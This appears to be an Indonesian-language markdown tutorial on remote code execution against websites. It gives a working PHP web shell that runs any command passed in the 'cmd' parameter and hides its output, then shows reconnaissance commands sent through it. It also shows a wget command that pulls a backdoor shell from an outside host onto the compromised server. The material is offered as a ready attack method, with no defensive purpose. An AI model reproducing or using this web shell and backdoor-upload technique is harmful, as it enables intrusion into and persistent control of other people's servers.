### Remote Code Execution

<p align="center">
<img src="https://i.ibb.co/3TNyvvW/20201211-095009.png" height="50" width="50">

Basic For Remote Code Execution ( Critical )

merupakan suatu teknik serangan pada website dengan cara mengeksekusi kode berbahaya dan mengambil alih kendali akses ke sistem komputer. attacker mempunyai kemampuan untuk mengeksekusi perintah di mesin target, biasanya memanfaatkan kelemahan aplikasi yang dijadikan target eksploitasi.
Remote Command Execution (RCE) atau Remote Arbitary Command Execution (ACE) adalah bug yg memungkinkan attacker untuk menjalankan command2 secara remote melalui url. Bug ini biasanya terdapat pada aplikasi yg mnggunakan cgi.

Contoh Kasus Nya Kayak Gini Lur

```
<style>body{font-size: 0;}h1{font-size: 12px}</style><h1>
<?php if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}else{echo '<img src="https://i.ibb.co/3TNyvvW/20201211-095009.png" border=0>
';}__halt_compiler();?></h1>
```

### Basic Rce

Misal Gua Upload File : rce.php

Request Dari php nya adalah = cmd

Cara Akses ? :
```
http://site.com/rce.php?cmd=
```

Oke Kita Jalankan Beberapa Perintah Dasar RCE
```
http://site.com/rce.php?cmd=ls
http://site.com/rce.php?cmd=whoami
http://site.com/rce.php?cmd=uname -a
http://site.com/rce.php?cmd=pwd
http://site.com/rce.php?cmd=ps aux

```

### Reverse Shell Via RCE
Kita Menggunakan Command wget 
```
http://site.com/rce.php?cmd=wget http://dyan6etar.cf/shell.txt -O namashell.php
```
Jika Sudah Kita Akses Di Dokumen Root : site.com/namashell.php

### Penjelasan Singkat
Penjelasan Singkat Tentang Command wget :

wget menurut Otak Gua : Menarik File Dari Luar Server dan Juga Membuat Di Dalam Server

Sedangkan -O Untuk Menamakan File Tersebut 

Sebagai contoh : Saya Telah Membuat Shell Dengan Ekstensi txt Dan Menguploadnya di hosting lain artinya itu diluar server , nah dengan perintah wget kita bisa menarik file itu ke dalam server cuk dan di buat filenya dengan perintah -O.

Tentu Saja Ini Bisa Di Manfaatkan Untuk Up Shell BackDoor

Oke Sekian Sayang:v
